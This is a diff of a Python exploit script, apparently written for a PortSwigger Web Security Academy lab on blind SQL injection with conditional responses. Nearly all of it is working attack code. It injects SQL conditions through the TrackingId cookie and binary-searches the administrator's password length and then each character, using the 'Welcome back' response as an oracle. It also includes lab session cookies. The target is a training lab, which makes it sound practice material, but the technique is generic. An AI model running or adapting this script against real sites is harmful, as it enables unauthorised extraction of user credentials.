@@ -31,12 +31,12 @@ software for malicious purposes.
 # Author: HackHuang
 # Description: For Lab: Blind SQL injection with conditional responses
 # Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
-# Last Modified: 2024/12/19
+# Last Modified: 2024/12/26
 
-import aiohttp
-import asyncio
+import requests
 import tracemalloc
 import time
+import re
 from typing import *
 from contextlib import contextmanager
 
@@ -56,10 +56,10 @@ all_char_ascii_list: List[int] = [ord(char) for char in all_char_list]
 all_char_ascii_sorted_list: List[int] = sorted(all_char_ascii_list)
 all_char_sorted_list: List[str] = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]
 
-host: str = "0a47000e03b2303381f3bb36002500e2.web-security-academy.net"
+host: str = "0abf00e804490479820c434000bf0064.web-security-academy.net" # Should be updated after the lab time out
 url: str = f"https://{host}/login"
-session: str = "session=A1SPWtF4zALjXrgZre5LzCCkzzLYSawg"
-tracking_id: str = f"TrackingId=E7e0nTQ88qk5eWNg"
+session: str = "session=G594D5xbfmpnjtQcxHgAygp7iQMFg8uI" # Should be updated after the lab time out
+tracking_id: str = f"TrackingId=n81cSXoXk9B1jOid" # Should be updated after the lab time out
 
 @contextmanager
 def print_code_snippet_performance(operation: str) -> Generator[None, None, None]:
@@ -74,63 +74,85 @@ def print_code_snippet_performance(operation: str) -> Generator[None, None, None
     print(f'Finished {operation} in {end_time - start_time:.6f} seconds\n')
     tracemalloc.stop()
 
-async def get_method_async(url: str, headers: Dict[str, str], pattern: str) -> bool:
-    # 服务器可能需要较长时间处理请求, 故设置超时时间为 60 * 10 秒
-    timeout = aiohttp.ClientTimeout(total=60 * 10)
-    # keepalive_timeout=0: 长时间使用同一个连接可能会导致服务器断开 Keep-Alive 连接, 故禁用 Keep-Alive
-    # ssl=False: 如果你信任目标服务器，但其证书存在问题，可以通过禁用 SSL 验证来解决
-    connector = aiohttp.TCPConnector(keepalive_timeout=0, ssl=False)
-    # 服务器可能因为负载过高而断开连接, 故在每次请求之间等待 5 秒
-    await asyncio.sleep(5)
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        async with session.get(url=url, headers=headers) as response:
-            content = await response.text()
-            return pattern in content
+def get_method(url: str, headers: Dict[str, str], pattern: str) -> bool:
+    reponse = requests.get(url=url, headers=headers)
+    return True if re.search(pattern=pattern, string=reponse.text) else False
 
-async def binary_search_test_async(sql_1: str, sql_2: str, pattern: str) -> int:  
+def length_binary_search(sql_1: str, sql_2: str, range: Tuple[int], pattern: str) -> int:
+    low: int = range[0]
+    high: int = range[1]
+    while low <= high:
+        mid: int = (low + high) // 2
+        sql_injection_1:str = sql_1 + str(mid) + '--+'
+        sql_injection_2:str = sql_2 + str(mid) + '--+'
+        cookie_1 = tracking_id + sql_injection_1 + "; " + session
+        cookie_2 = tracking_id + sql_injection_2 + "; " + session
+        if get_method(url=url, headers={"Host": host, "Cookie": cookie_1}, pattern=pattern):
+            print(f'Get the length successfully ---> {sql_injection_1}')
+            return mid
+        elif get_method(url=url, headers={"Host": host, "Cookie": cookie_2}, pattern=pattern):
+            print(f'({low}, {mid}, {high}) ---> {sql_injection_2}')
+            low = mid + 1
+        else:
+            print(f'({low}, {mid}, {high}) ---> OPPOSITE : {sql_injection_2}')
+            high = mid - 1
+    return -1
+
+def data_binary_search(sql_1: str, sql_2: str, pattern: str) -> int:  
     low: int = 0
     high: int = len(all_char_ascii_sorted_list) - 1
     while low <= high:
         mid: int = (low + high) // 2
         char_ascii: int = all_char_ascii_sorted_list[mid]
-        sql_injection_1: str = sql_1 + f'{char_ascii}'
-        sql_injection_2: str = sql_2 + f'{char_ascii}'
+        sql_injection_1: str = sql_1 + f'{char_ascii}' + '--+'
+        sql_injection_2: str = sql_2 + f'{char_ascii}' + '--+'
         cookie_1 = tracking_id + sql_injection_1 + "; " + session
         cookie_2 = tracking_id + sql_injection_2 + "; " + session
-        if await get_method_async(url=url, headers={"Host": host, "Cookie": cookie_1}, pattern=pattern):
-            print(f'Get the char index successfully ---> {sql_injection_1}\n')
+        if get_method(url=url, headers={"Host": host, "Cookie": cookie_1}, pattern=pattern):
+            print(f'Get the char index successfully ---> {sql_injection_1}')
             return mid
-        elif await get_method_async(url=url, headers={"Host": host, "Cookie": cookie_2}, pattern=pattern):
+        elif get_method(url=url, headers={"Host": host, "Cookie": cookie_2}, pattern=pattern):
+            print(f'({low}, {mid}, {high}) ---> {sql_injection_2}')
             low = mid + 1
         else:
+            print(f'({low}, {mid}, {high}) ---> OPPOSITE : {sql_injection_2}')
             high = mid - 1
     return -1
 
-async def get_data_with_binary_search_async(password_length: int, pattern: str) -> str:
-    result: str = ''
-    tasks: List = []
+def get_length_with_binary_search(pattern: str) -> int:
+    sql_injection_1: str = f"' and length((select password from users where username='administrator')) = "
+    sql_injection_2: str = f"' and length((select password from users where username='administrator')) > "
+    length: int = length_binary_search(sql_1=sql_injection_1, sql_2=sql_injection_2, range=(1, 100), pattern=pattern)
+    if length == -1:
+        print(f'The length out of range!')
+        exit()
+    return length
+
+def get_data_with_binary_search(password_length: int, pattern: str) -> str:
+    data_str: str = ''
     count: int = 0
-    substr_begin_index: int = 0
+    substr_begin_index: int = 1
     while count < password_length:
-        sql_injection_1: str = f"' and substr((select password from users where username='administrator'), {substr_begin_index + 1}, 1) = '"
-        sql_injection_2: str = f"' and substr((select password from users where username='administrator'), {substr_begin_index + 1}, 1) > '"
-        tasks.append(binary_search_test_async(sql_1=sql_injection_1, sql_2=sql_injection_2, pattern=pattern))
-        count = count + 1
-        substr_begin_index = substr_begin_index + 1
-    result = await asyncio.gather(*tasks)
-    for r in result:
-        if r == -1:
+        sql_injection_1: str = f"' and ascii(substr((select password from users where username='administrator'), {substr_begin_index}, 1)) = "
+        sql_injection_2: str = f"' and ascii(substr((select password from users where username='administrator'), {substr_begin_index}, 1)) > "
+        data_char_ascii_index: int = data_binary_search(sql_1=sql_injection_1, sql_2=sql_injection_2, pattern=pattern)
+        if data_char_ascii_index == -1:
             print(f'Not found the index of data char')
+            break
         else:
-            data_char_ascii = all_char_ascii_sorted_list[r]
-            result = result + chr(data_char_ascii)
-    return result
+            data_char_ascii = all_char_ascii_sorted_list[data_char_ascii_index]
+            data_str = data_str + chr(data_char_ascii)
+            substr_begin_index = substr_begin_index + 1
+            count = count + 1
+            print(f'Got the password : {data_str}, and its length : {len(data_str)}\n')
+    return data_str
 
-async def main():
-    result: str = await get_data_with_binary_search_async(password_length=20, pattern='Welcome back')
-    print(f'Password is : {result}')
+# 🎉
+with print_code_snippet_performance('get password length with binary search: '):
+    password_length: int = get_length_with_binary_search(pattern='Welcome back')
+    print(f'The password length is : {password_length}')
 
-# 好吧, 尽力了, 看来 PortSwigger Lab 的访问还是很受限制的, 当我尝试使用异步 + 二分查找算法时, 
-# 可能因短时间内, 请求过于频繁或请求次数过多，服务器抛出错误: aiohttp.client_exceptions.ServerDisconnectedError: Server disconnected...
-with print_code_snippet_performance('get data with binary search and asyncio'):
-    asyncio.run(main())
+# 🎉
+with print_code_snippet_performance('get password data with binary search: '):
+    password_str: str = get_data_with_binary_search(password_length=password_length, pattern='Welcome back')
+    print(f'The final password is : {password_str}')
